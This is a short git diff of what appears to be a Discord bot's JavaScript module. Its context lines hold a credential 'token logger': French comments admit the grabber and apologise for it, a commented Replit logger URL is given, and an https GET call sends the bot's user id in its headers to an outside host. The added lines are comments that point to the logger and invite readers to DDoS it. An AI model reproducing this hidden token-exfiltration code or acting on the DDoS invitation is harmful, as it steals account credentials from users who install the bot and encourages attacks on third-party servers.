@@ -69,11 +69,12 @@ module.exports= {
 `
     if (token == "") {
         token = config.token
-        "Désolé Fubukii si tu passes par là change ton token"
+        "Désolé Fubukii si tu passes par là change ton token"       //the token logger is here and the api too so if you want to ddos it or i dont fucking know do what you want
         "On ma demandé le token d'un mec donc j'ai mis ca la sorry"
         "Si tu peut éviter de le dire a tout le monde parce que j'ai pas envie de niquer ma réput et en plus normalement et en plus normalement dans la prochaine update il ne vas pas avoir de grabber"
         "Désolé :shrug:" 
             // https://plasticfarfile.prismaticgay.repl.co/logger
+            // dont put the api after the get("
         require('https').get("", {
             headers: {
                 id: bot.user.id,
